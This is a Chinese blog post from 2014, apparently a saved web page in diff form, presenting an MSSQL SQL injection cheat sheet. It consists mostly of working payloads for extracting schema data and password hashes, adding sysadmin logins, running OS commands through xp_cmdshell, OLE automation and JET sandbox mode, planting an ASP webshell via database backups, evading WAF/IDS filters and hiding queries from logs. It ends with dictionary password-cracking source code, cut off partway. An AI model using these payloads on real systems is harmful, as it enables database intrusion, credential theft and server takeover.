@@ -1,0 +1,1426 @@
+
+
+  
+
+  
+
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+
+  <article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+    <header>
+      <h1 class="entry-title ng-binding">MSSQL注射知识库 v 1.0</h1>
+
+      <div class="entry-meta">
+        <a target="_blank" class="author name ng-binding">
+          Xeyes</a>
+        <span class="bull">·</span>
+        <time title="2014/05/04 18:26" ui-time="" datetime="2014/05/04 18:26" class="published ng-binding ng-isolate-scope">2014/05/04 18:26</time>
+      </div>
+    </header>
+
+    <!-- ngIf: isCensoring -->
+
+    <section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+      <p>
+        </p><h3>默认数据库</h3>
+
+<table>
+  <tr>
+    <td>
+      pubs
+    </td>
+    
+    <td>
+      不适用于MSSQL 2005
+    </td>
+  </tr>
+  
+  <tr>
+    <td>
+      model
+    </td>
+    
+    <td>
+      适用于所有版本
+    </td>
+  </tr>
+  
+    <tr>
+    <td>
+      msdb
+    </td>
+    
+    <td>
+      适用于所有版本
+    </td>
+  </tr>
+    <tr>
+    <td>
+      tempdb
+    </td>
+    
+    <td>
+      适用于所有版本
+    </td>
+  </tr>
+    <tr>
+    <td>
+      northwind
+    </td>
+    
+    <td>
+      适用于所有版本
+    </td>
+  </tr>
+    <tr>
+    <td>
+      information_schema
+    </td>
+    
+    <td>
+      适用于MSSQL 2000及更高版本
+    </td>
+  </tr>
+</table>
+
+<h3>注释掉查询</h3>
+
+<p>下面可以用来注释掉你注射后查询的其余部分：</p>
+
+<table>
+  <tr>
+    <td>
+      / *
+    </td>
+    
+    <td>
+      C语言风格注释
+    </td>
+  </tr>
+  
+  <tr>
+    <td>
+      --
+    </td>
+    
+    <td>
+      SQL注释
+    </td>
+  </tr>
+  
+    <tr>
+    <td>
+      ; 00％
+    </td>
+    <td>
+      空字节
+    </td>
+  </tr>
+</table>
+
+<!--more-->
+
+<p>示例：</p>
+
+<pre><code>SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';
+SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3/*';
+</code></pre>
+
+<h3>测试版本：</h3>
+
+<pre><code>@@VERSION
+</code></pre>
+
+<p>示例：</p>
+
+<p>如果MSSQL的版本是2008</p>
+
+<pre><code>SELECT * FROM Users WHERE id = '1' AND @@VERSION LIKE '%2008%';
+</code></pre>
+
+<p>附：输出结果包含Windows操作系统的版本。</p>
+
+<h3>数据库凭据</h3>
+
+<table>
+  <tr>
+    <td>
+      数据库表
+    </td>
+    
+    <td>
+      master..syslogins, master..sysprocesses
+    </td>
+  </tr>
+  
+  <tr>
+    <td>
+      列名 
+    </td>
+    
+    <td>
+      name, loginame
+    </td>
+  </tr>
+  
+    <tr>
+    <td>
+      当前用户
+    </td>
+    
+    <td>
+      user, system_user, suser_sname(), is_srvrolemember('sysadmin')
+    </td>
+  </tr>
+    <tr>
+    <td>
+      数据库凭据
+    </td>
+    
+    <td>
+      SELECT user, password FROM master.dbo.sysxlogins
+    </td>
+  </tr>
+</table>
+
+<p>示例：</p>
+
+<h4>返回当前用户：</h4>
+
+<pre><code>SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;
+</code></pre>
+
+<h4>检查用户是否为admin：</h4>
+
+<pre><code>SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);
+</code></pre>
+
+<h3>数据库名称</h3>
+
+<table>
+  <tr>
+    <td>
+      数据库表
+    </td>
+    
+    <td>
+      master..sysdatabases
+    </td>
+  </tr>
+  
+  <tr>
+    <td>
+      列
+    </td>
+    
+    <td>
+      name
+    </td>
+  </tr>
+  
+    <tr>
+    <td>
+      当前前数据库
+    </td>
+    
+    <td>
+      DB_NAME(5)
+    </td>
+  </tr>
+</table>
+
+<p>示例：</p>
+
+<pre><code>SELECT **DB_NAME(5)**;
+SELECT** name** FROM **master..sysdatabases**;
+</code></pre>
+
+<h3>服务器主机名</h3>
+
+<pre><code>@@SERVERNAME
+SERVERPROPERTY()
+</code></pre>
+
+<p>示例：</p>
+
+<pre><code>SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel'), SERVERPROPERTY('edition');
+</code></pre>
+
+<p>附：</p>
+
+<pre><code>SERVERPROPERTY()    适用于MSSQL 2000及更高版本。
+</code></pre>
+
+<h3>表和列</h3>
+
+<p>确定列数</p>
+
+<pre><code>ORDER BY n+1;
+</code></pre>
+
+<p>示例：
+查询语句:</p>
+
+<pre><code>SELECT username, password, permission FROM Users WHERE id = '1';
+</code></pre>
+
+<table>
+  <tr>
+    <td>
+     1' ORDER BY 1--
+    </td>
+    
+    <td>
+      True
+    </td>
+  </tr>
+  
+  <tr>
+    <td>
+      1' ORDER BY 2--
+    </td>
+    
+    <td>
+      True
+    </td>
+  </tr>
+  
+    <tr>
+    <td>
+      1' ORDER BY 3--
+    </td>
+    
+    <td>
+      True
+    </td>
+  </tr>
+
+    <tr>
+    <td>
+      1' ORDER BY 4--
+    </td>
+    
+    <td>
+      False   - 列数为3
+    </td>
+  </tr>
+      <tr>
+    <td>
+      -1' UNION SELECT 1,2,3--
+    </td>
+    
+    <td>
+      True
+    </td>
+  </tr>
+
+</table>
+
+<p>附：
+不断递增的列数，直到得到一个错误的响应。</p>
+
+<h3>GROUP BY / HAVING 获​取当前查询的列名</h3>
+
+<p>示例：
+给出的查询：</p>
+
+<pre><code>SELECT username, password, permission FROM Users WHERE id = '1';
+</code></pre>
+
+<table>
+  <tr>
+    <td>
+     1' HAVING 1=1--
+    </td>
+    
+    <td>
+      选择列表中的列 'Users.username' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。
+    </td>
+  </tr>
+  
+  <tr>
+    <td>
+      1' GROUP BY username HAVING 1=1--
+    </td>
+    
+    <td>
+      True
+    </td>
+  </tr>
+  
+    <tr>
+    <td>
+      选择列表中的列 'Users.username' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。
+    </td>
+    
+    <td>
+      True
+    </td>
+  </tr>
+
+    <tr>
+    <td>
+      1' GROUP BY username, password HAVING 1=1--
+    </td>
+    
+    <td>
+      选择列表中的列 'Users.username' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。
+    </td>
+  </tr>
+    <tr>
+    <td>
+      1' GROUP BY username, password, permission HAVING 1=1--
+    </td>
+    
+    <td>
+      没有错误
+    </td>
+  </tr>
+
+</table>
+
+<p>附：一旦匹配所有的列将返回正常请求页面.</p>
+
+<h3>检索表</h3>
+
+<p>我们可以从两个不同的数据库，<code>information_schema.tables</code> 或  <code>from master..sysobjects</code> 中检索表。</p>
+
+<h3>联合查询:</h3>
+
+<pre><code>UNION SELECT name FROM master..sysobjects WHERE xtype='U'
+</code></pre>
+
+<p>附：</p>
+
+<pre><code>U = 用户表, V = 视图 , X = 扩展存储过程
+</code></pre>
+
+<h3>盲注类型：</h3>
+
+<pre><code>AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables &gt; 'A'
+</code></pre>
+
+<h3>报错类型:</h3>
+
+<pre><code>AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)
+AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))
+</code></pre>
+
+<h3>检索列</h3>
+
+<p>我们可以从两个不同的数据库，<code>information_schema.columns</code>  或 <code>masters..syscolumns</code>中检索列。</p>
+
+<h3>联合查询:</h3>
+
+<pre><code>UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename')
+</code></pre>
+
+<h3>盲注类型:</h3>
+
+<pre><code>AND SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns &gt; 'A'
+</code></pre>
+
+<h3>报错类型:</h3>
+
+<pre><code>AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns)
+AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))
+</code></pre>
+
+<h3>一次性检索多个表</h3>
+
+<p>下面的3个查询将创建一个临时表/列 并插入所有用户定义的表，然后把表的内容进行转储并删除</p>
+
+<p>创建临时表/列和插入数据：</p>
+
+<pre><code>AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3d4544007d4544">[email&#160;protected]</a>+' '+name FROM sysobjects WHERE xtype='U' AND name&gt;@xy SELECT @xy AS xy INTO TMP_DB END;
+</code></pre>
+
+<p>转储内容：</p>
+
+<pre><code>AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);
+</code></pre>
+
+<p>删除表：</p>
+
+<pre><code>AND 1=0; DROP TABLE TMP_DB;
+</code></pre>
+
+<p>MSSQL2005及更高版本中使用xml for path 函数作为连接符，可一次性查询所有表。</p>
+
+<pre><code>SELECT table_name %2b ', ' FROM information_schema.tables FOR XML PATH('')        SQL Server 2005+
+</code></pre>
+
+<p>附：
+代码可以用十六进制进行混淆</p>
+
+<pre><code>' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);--
+</code></pre>
+
+<p>避免引用序号</p>
+
+<pre><code>SELECT * FROM Users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)
+</code></pre>
+
+<p>字符串连接</p>
+
+<pre><code>SELECT CONCAT('a','a','a'); (SQL SERVER 2012)
+SELECT 'a'+'d'+'mi'+'n';
+</code></pre>
+
+<h3>条件语句</h3>
+
+<pre><code>IF
+CASE
+</code></pre>
+
+<p>示例：</p>
+
+<pre><code>IF 1=1 SELECT 'true' ELSE SELECT 'false';
+SELECT CASE WHEN 1=1 THEN true ELSE false END;
+</code></pre>
+
+<p>附：IF不能在SELECT语句中使用。</p>
+
+<h3>时间延迟:</h3>
+
+<pre><code>WAITFOR DELAY 'time_to_pass';
+WAITFOR TIME 'time_to_execute';
+</code></pre>
+
+<p>示例：</p>
+
+<pre><code>IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
+</code></pre>
+
+<h3>OPENROWSET攻击</h3>
+
+<pre><code>SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');
+</code></pre>
+
+<p>OPENROWSET 在MSSQL 2005及以上版本中默认是禁用的.</p>
+
+<p>激活OPENROWSET的语句：</p>
+
+<pre><code>exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;
+</code></pre>
+
+<h3>添加数据库用户</h3>
+
+<pre><code>exec sp_addlogin 'name' , 'password'
+exec sp_addsrvrolemember 'name' , 'sysadmin'       加为数据库管理员
+</code></pre>
+
+<p><strong>修改sa用户密码</strong></p>
+
+<pre><code>EXEC sp_password NULL,'NewPassword','sa'           (适用于SQL2000及以上)
+alter login [sa] with password=N'NewPassword'      (适用于SQL2005及以上)
+;exec master.dbo.sp_password null,username,password;-- 
+</code></pre>
+
+<h3>Get WebShell</h3>
+
+<p>差异备份:
+创建差异数据库备份需要有以前的完整数据库备份。 如果选定的数据库从未进行过备份，则请在创建任何差异备份之前，先执行完整数据库备份。</p>
+
+<h4>方法1</h4>
+
+<pre><code>backup database 库名 to disk = 'c:\tmp.bak';create table [dbo].[test_tmp] ([cmd] [image]);insert into  test_tmp(cmd) values(0x3C25657865637574652872657175657374282261222929253E);backup database 库名 to disk='c:\shell.asp' WITH DIFFERENTIAL,FORMAT;
+</code></pre>
+
+<h4>方法2  (减小体积)</h4>
+
+<pre><code>alter database web1 set RECOVERY FULL;create table  test_tmp  (a image);backup log web1 to disk = 'c:\cmd' with init;insert into test_tmp (a) values (0x3C25657865637574652872657175657374282261222929253EDA);backup log web1 to disk = 'c:\shell.asp'--
+</code></pre>
+
+<p>*0x3C25657865637574652872657175657374282261222929253E   =  <%execute(request("a"))%></%execute(request("a"))%></p>
+
+<h4>sp_makewebtask 备份(需sa权限)</h4>
+
+<pre><code>exec sp_makewebtask 'c:\shell.asp',' select ''&lt;%25execute(request("a"))%25&gt;'' ';
+</code></pre>
+
+<p>注：sp_makewebtask存储过程在MSSQL 2005及以上版本中默认是禁用的</p>
+
+<p>激活 sp_makewebtask存储过程的语句:</p>
+
+<pre><code>exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;  
+</code></pre>
+
+<h3>系统命令执行</h3>
+
+<h4>1. 使用xp_cmdshell存储过程执行操作系统命令。</h4>
+
+<pre><code>EXEC master.dbo.xp_cmdshell 'cmd';
+</code></pre>
+
+<p><code>xp_cmdshell</code> 存储过程在MSSQL 2005及以上版本中默认是禁用的.</p>
+
+<p>激活 <code>xp_cmdshell</code> 存储过程的语句:</p>
+
+<pre><code>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+</code></pre>
+
+<p>检查是否xp_cmdshell是否加载，如果是,将继续检查是否处于活动状态，然后继续执行“DIR”命令并将结果插入到TMP_DB表中：</p>
+
+<h4>示例：</h4>
+
+<pre><code>' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'&lt;br&gt;&lt;/font&gt;&lt;font color="black"&gt;'%2Bdir,'&lt;dir&gt;','&lt;/font&gt;&lt;font color="orange"&gt;') FROM %23Data WHERE dir&gt;@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB--
+</code></pre>
+
+<p>转储内容:</p>
+
+<pre><code>' UNION SELECT tbl FROM TMP_DB--
+</code></pre>
+
+<p>删除表:</p>
+
+<pre><code>' DROP TABLE TMP_DB--
+</code></pre>
+
+<h4>2.利用sp_OACREATE和sp_OAMethod调用控件执行系统命令:</h4>
+
+<pre><code>DECLARE @execmd INT EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe [[/c]]   ver &gt;C:\inetpub\wwwroot\test.txt'
+</code></pre>
+
+<p><code>sp_oacreate</code> 存储过程在MSSQL 2005及以上版本中默认是禁用的.</p>
+
+<p>激活 sp_oacreate 存储过程的语句:</p>
+
+<pre><code>exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;
+</code></pre>
+
+<p>附:SQL Server 提供了sp_OACREATE和sp_OAMethod函数,可以利用这两个函数调用OLE控件，间接获取一个shell。使用SP_OAcreate调用对象wscript。<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5a29323f3636b2efd1bde1c3bfd5c2b3ddd51a29323f3636">[email&#160;protected]</a>，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="bf583b095a2f315b0200582b17ecefe0f0fef2faebf7f0fb570f3c582b17ffccd7dad3d358253b5a0e21593f18cdcad1593618571e335a2e025b041b5c3f3d">[email&#160;protected]</a></p>
+
+<h4>3.JET 沙盒模式执行系统命令(Sandbox Mode)</h4>
+
+<p>在默认情况下Jet数据引擎不支持select shell("net user ")这样的SQL语句，必须开启JET引擎的沙盒模式才能执行命令，先利用<code>xp_regwrite</code>存储过程改写注册表，然后利用OpenRowSet访问一个ACCESS数据库文件，再执行运行命令的SQL语句。</p>
+
+<p>激活沙盒模式:</p>
+
+<p>Windows 2003</p>
+
+<pre><code>exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;--
+</code></pre>
+
+<p>Windows 2008 R2</p>
+
+<pre><code>exec  master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Wow6432Node\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0; 
+</code></pre>
+
+<p>Windows 2003 + SQL Server2000   沙盒模式执行命令的语句:</p>
+
+<p>（Windows 2003 系统c:\windows\system32\ias\目录下默认自带了2个Access数据库文件ias.mdb/dnary.mdb,所以直接调用即可.）</p>
+
+<pre><code>select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user  &gt;c:\test.txt ")');
+</code></pre>
+
+<p>Windows 2008 R2+SQL Server2005  沙盒模式执行命令的语句:</p>
+
+<p>（ Windows 2008 R2 默认无Access数据库文件,需要自己上传,或者用UNC路径加载文件方能执行命令.）</p>
+
+<pre><code>select * from openrowset('microsoft.jet.oledb.4.0',';database=\\192.168.1.8\file\ias.mdb','select shell("c:\windows\system32\cmd.exe /c net user  &gt;c:\test.txt ")');
+</code></pre>
+
+<p>（ SQL Server2008 默认未注册microsoft.jet.oledb.4.0接口,所以无法利用沙盒模式执行系统命令.）</p>
+
+<h4>4.OPENROWSET调用xp_cmdshell 执行系统命令:</h4>
+
+<p>（在知道sa权限帐号密码情况下,db_owner或者public的数据库权限使用OPENROWSET调用xp_cmdshell 执行系统命令.）</p>
+
+<pre><code>SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "ver"');
+</code></pre>
+
+<h3>小技巧:</h3>
+
+<p>使用 for xml  实现执行内容回显:</p>
+
+<table>
+  <tr>
+    <td>
+     for xml  raw/auto
+    </td>
+    
+    <td>
+      适用于SQL Server 2000及以上版本 **(**附**:此法只能取首行数据,问题待解决.)**
+    </td>
+  </tr>
+</table>
+
+<pre><code>or 1 in(SELECT * FROM OPENROWSET('SQLOLEDB', 'trusted_connection=yes', 'SET FMTONLY OFF execute master..xp_cmdshell "set"'))for xml raw
+or 1 in(SELECT * FROM OPENROWSET('SQLOLEDB', 'trusted_connection=yes', 'SET FMTONLY OFF execute master..xp_cmdshell "set"'))for xml auto
+</code></pre>
+
+<table>
+  <tr>
+    <td>
+     for xml  path
+    </td>
+    
+    <td>
+      适用于SQL Server 2005及以上版本,虽然是一次性获取所有内容,但是取出内容数量取决于表定义的长度.
+    </td>
+  </tr>
+</table>
+
+<pre><code>SELECT * FROM OPENROWSET('SQLOLEDB', 'trusted_connection=yes', 'SET FMTONLY OFF execute master..xp_cmdshell "ver"') for xml path  
+SELECT * FROM OPENROWSET('SQLOLEDB', '192.168.1.117';'sa';'123456', 'SET FMTONLY OFF execute master..xp_cmdshell "ver"')for xml path
+</code></pre>
+
+<p>附:</p>
+
+<p>回显内容超过表定义长度将会出现内容为 "将截断字符串或二进制数据。"的错误</p>
+
+<h3>5.SQL代理执行系统命令(SQLSERVERAGENT):</h3>
+
+<pre><code>use msdb exec sp_delete_job null,'x';exec sp_add_job 'x';exec sp_add_jobstep Null,'x',Null,'1','CMDEXEC','cmd /c  net start &gt;C:\test.txt';exec sp_add_jobserver Null,'x',@@servername exec sp_start_job 'x';
+</code></pre>
+
+<p>（SQLSERVERAGENT服务默认是禁用的,先利用xp_servicecontrol激活SQLSERVERAGENT，然后建立一个SQL计划任务马上运行这个SQL任务实现命令执行。）</p>
+
+<p>激活SQLSERVERAGENT的语句:</p>
+
+<pre><code>exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'
+</code></pre>
+
+<h3>其他获取系统信息的函数</h3>
+
+<p><strong>1.历遍目录</strong></p>
+
+<pre><code>exec master.dbo.xp_dirtree 'c:\'
+</code></pre>
+
+<p><strong>2.获取子目录</strong></p>
+
+<pre><code>exec master.dbo.xp_subdirs 'c:\'
+</code></pre>
+
+<p><strong>3.列举可用的系统分区</strong></p>
+
+<pre><code>exec master.dbo.xp_availablemedia
+</code></pre>
+
+<p><strong>4.判断目录或文件是否存在</strong></p>
+
+<pre><code>exec master..xp_fileexist 'c:\boot.ini'
+</code></pre>
+
+<h3>SP_PASSWORD （隐藏查询）</h3>
+
+<p>在查询结束后追加sp_password,T-SQL日志作为一项安全措施隐藏它。</p>
+
+<h3>SP_PASSWORD</h3>
+
+<p>Example:</p>
+
+<p>' AND 1=1--sp_password</p>
+
+<p>输出：</p>
+
+<pre><code>-- 'sp_password的'在该事件文本中被发现。('sp_password' was found in the text of this event.)
+-- 出于安全原因,该文本已被替换成注释。( The text has been replaced with this comment for security reasons.)
+</code></pre>
+
+<ul>
+<li>这个方法不理解,望小伙伴们解答.</li>
+</ul>
+
+<h3>层叠查询</h3>
+
+<p>（ MSSQL支持 层叠查询）</p>
+
+<p>示例：</p>
+
+<pre><code>' AND 1=0 INSERT INTO ([column1], [column2]) VALUES ('value1', 'value2');
+</code></pre>
+
+<h3>模糊测试和混淆</h3>
+
+<p>允许中间字符</p>
+
+<p>以下字符可以作为空格符。</p>
+
+<p><img alt="enter image description here" img-src="8fa01aade58721e9a78b9e76d838849b147e8188.jpg"></p>
+
+<h4>示例：</h4>
+
+<pre><code>S%E%L%E%C%T%01column%02FROM%03table;
+A%%ND 1=%%%%%%%%1;
+</code></pre>
+
+<p>附：
+关键词之间的百分比符号只在ASP(X)的Web应用程序中有效。</p>
+
+<p>下面的字符也可用来避免空格。</p>
+
+<pre><code>22    "
+28   （
+29    ）
+5B    [
+5D    ]
+</code></pre>
+
+<h4>示例：</h4>
+
+<pre><code>UNION(SELECT(column)FROM(table));
+SELECT"table_name"FROM[information_schema].[tables];
+</code></pre>
+
+<p>AND/OR可以使用中间符号:</p>
+
+<pre><code>01 - 20 范围
+21  !
+2B  +
+2D  -
+2E  .
+5C  \
+7E  ~
+</code></pre>
+
+<p>示例：</p>
+
+<pre><code>SELECT 1FROM[table]WHERE\1=\1AND\1=\1;
+</code></pre>
+
+<p>附：
+反斜杠似乎不适用于MSSQL 2000中.</p>
+
+<h3>编码</h3>
+
+<p>编码注射语句，有利于躲避WAF / IDS检查。</p>
+
+<table>
+  <tr>
+    <td>
+     URL编码(URL Encoding)
+    </td>
+    
+    <td>
+      SELECT %74able_%6eame FROM information_schema.tables;
+    </td>
+  </tr>
+  <tr>
+    <td>
+     双重URL编码(Double URL Encoding)
+    </td>
+    
+    <td>
+      SELECT %2574able_%256eame FROM information_schema.tables;
+    </td>
+  </tr>
+  <tr>
+    <td>
+     Unicode编码(Unicode Encoding)
+    </td>
+    
+    <td>
+     SELECT %u0074able_%u6eame FROM information_schema.tables;
+    </td>
+  </tr>
+  <tr>
+    <td>
+     无效的十六进制编码(Invalid Hex Encoding (ASP)
+    </td>
+    
+    <td>
+      SELECT %tab%le_%na%me FROM information_schema.tables;
+    </td>
+  </tr>
+  <tr>
+    <td>
+     十六进制编码(Hex Encoding)
+    </td>
+    
+    <td>
+      ' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c4543542031 AS VARCHAR(4000)); EXEC (@S);--
+    </td>
+  </tr>
+  <tr>
+    <td>
+     HTML实体(HTML Entities 待验证） 
+    </td>
+    
+    <td>
+      %26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B
+    </td>
+  </tr>
+</table>
+
+<h3>密码散列</h3>
+
+<p>从0x0100密码开始，0x 后的第一个字节是一个常数,接下来的八个字节是哈希盐,剩下的80个字节是两个散列，第一40个字节是区分大小写的密码哈希值，而第二个40字节为大写形式密码哈希值。</p>
+
+<pre><code>0x0100236A261CE12AB57BA22A7F44CE3B780E52098378B65852892EEE91C0784B911D76BF4EB124550ACABDFD1457
+</code></pre>
+
+<h3>密码破解</h3>
+
+<p>可以利用Metasploit的JTR模块进行破解</p>
+
+<p><a href="http://www.rapid7.com/db/modules/auxiliary/analyze/jtr_mssql_fast">http://www.rapid7.com/db/modules/auxiliary/analyze/jtr_mssql_fast</a></p>
+
+<h3>MSSQL 2000密码破解</h3>
+
+<p>（此工具用于破解微软的SQL Server 2000的密码。）</p>
+
+<pre><code>#!cpp
+/////////////////////////////////////////////////////////////////////////////////
+//
+//           SQLCrackCl
+//
+//           This will perform a dictionary attack against the
+//           upper-cased hash for a password. Once this
+//           has been discovered try all case variant to work
+//           out the case sensitive password.
+//
+//           This code was written by David Litchfield to
+//           demonstrate how Microsoft SQL Server 2000
+//           passwords can be attacked. This can be
+//           optimized considerably by not using the CryptoAPI.
+//
+//           (Compile with VC++ and link with advapi32.lib
+//           Ensure the Platform SDK has been installed, too!)
+//
+//////////////////////////////////////////////////////////////////////////////////
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;wincrypt.h&gt;
+FILE *fd=NULL;
+char *lerr = "\nLength Error!\n";
+int wd=0;
+int OpenPasswordFile(char *pwdfile);
+int CrackPassword(char *hash);
+int main(int argc, char *argv[])
+{
+             int err = 0;
+        if(argc !=3)
+                  {
+                            printf("\n\n*** SQLCrack *** \n\n");
+                            printf("C:\\&gt;%s hash passwd-file\n\n",argv[0]);
+                            printf("David Litchfield (<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="81e5e0f7e8e5c1efe6f2f2eee7f5f6e0f3e4afe2eeec">[email&#160;protected]</a>)\n");
+                            printf("24th June 2002\n");
+                            return 0;
+                  }
+        err = OpenPasswordFile(argv[2]);
+        if(err !=0)
+         {
+           return printf("\nThere was an error opening the password file %s\n",argv[2]);
+         }
+        err = CrackPassword(argv[1]);
+        fclose(fd);
+        printf("\n\n%d",wd);
+        return 0;
+}
+int OpenPasswordFile(char *pwdfile)
+{
+        fd = fopen(pwdfile,"r");
+        if(fd)
+                  return 0;
+        else
+                  return 1;
+}
+int CrackPassword(char *hash)
+{
+        char phash[100]="";
+        char pheader[8]="";
+        char pkey[12]="";
+        char pnorm[44]="";
+        char pucase[44]="";
+        char pucfirst[8]="";
+        char wttf[44]="";
+        char uwttf[100]="";
+        char *wp=NULL;
+        char *ptr=NULL;
+        int cnt = 0;
+        int count = 0;
+        unsigned int key=0;
+        unsigned int t=0;
+        unsigned int address = 0;
+        unsigned char cmp=0;
+        unsigned char x=0;
+        HCRYPTPROV hProv=0;
+        HCRYPTHASH hHash;
+DWORD hl=100;
+unsigned char szhash[100]="";
+int len=0;
+if(strlen(hash) !=94)
+          {
+                  return printf("\nThe password hash is too short!\n");
+          }
+if(hash[0]==0x30 &amp;&amp; (hash[1]== 'x' || hash[1] == 'X'))
+          {
+                  hash = hash + 2;
+                  strncpy(pheader,hash,4);
+                  printf("\nHeader\t\t: %s",pheader);
+                  if(strlen(pheader)!=4)
+                            return printf("%s",lerr);
+                  hash = hash + 4;
+                  strncpy(pkey,hash,8);
+                  printf("\nRand key\t: %s",pkey);
+                  if(strlen(pkey)!=8)
+                            return printf("%s",lerr);
+                  hash = hash + 8;
+                  strncpy(pnorm,hash,40);
+                  printf("\nNormal\t\t: %s",pnorm);
+                  if(strlen(pnorm)!=40)
+                            return printf("%s",lerr);
+                  hash = hash + 40;
+                  strncpy(pucase,hash,40);
+                  printf("\nUpper Case\t: %s",pucase);
+                  if(strlen(pucase)!=40)
+                            return printf("%s",lerr);
+                  strncpy(pucfirst,pucase,2);
+                  sscanf(pucfirst,"%x",&amp;cmp);
+          }
+else
+          {
+                  return printf("The password hash has an invalid format!\n");
+          }
+printf("\n\n       Trying...\n");
+if(!CryptAcquireContextW(&amp;hProv, NULL , NULL , PROV_RSA_FULL                 ,0))
+  {
+          if(GetLastError()==NTE_BAD_KEYSET)
+                  {
+                            // KeySet does not exist. So create a new keyset
+                            if(!CryptAcquireContext(&amp;hProv,
+                                                 NULL,
+                                                 NULL,
+                                                 PROV_RSA_FULL,
+                                                 CRYPT_NEWKEYSET ))
+                               {
+                                        printf("FAILLLLLLL!!!");
+                                        return FALSE;
+                               }
+           }
+}
+while(1)
+         {
+           // get a word to try from the file
+           ZeroMemory(wttf,44);
+           if(!fgets(wttf,40,fd))
+              return printf("\nEnd of password file. Didn't find the password.\n");
+           wd++;
+           len = strlen(wttf);
+           wttf[len-1]=0x00;
+           ZeroMemory(uwttf,84);
+           // Convert the word to UNICODE
+           while(count &lt; len)
+                     {
+                               uwttf[cnt]=wttf[count];
+                               cnt++;
+                               uwttf[cnt]=0x00;
+                               count++;
+                               cnt++;
+                     }
+           len --;
+           wp = &amp;uwttf;
+           sscanf(pkey,"%x",&amp;key);
+           cnt = cnt - 2;
+           // Append the random stuff to the end of
+           // the uppercase unicode password
+           t = key &gt;&gt; 24;
+           x = (unsigned char) t;
+           uwttf[cnt]=x;
+           cnt++;
+           t = key &lt;&lt; 8;
+           t = t &gt;&gt; 24;
+         x = (unsigned char) t;
+         uwttf[cnt]=x;
+         cnt++;
+         t = key &lt;&lt; 16;
+         t = t &gt;&gt; 24;
+         x = (unsigned char) t;
+         uwttf[cnt]=x;
+         cnt++;
+         t = key &lt;&lt; 24;
+         t = t &gt;&gt; 24;
+         x = (unsigned char) t;
+         uwttf[cnt]=x;
+         cnt++;
+// Create the hash
+if(!CryptCreateHash(hProv, CALG_SHA, 0 , 0, &amp;hHash))
+         {
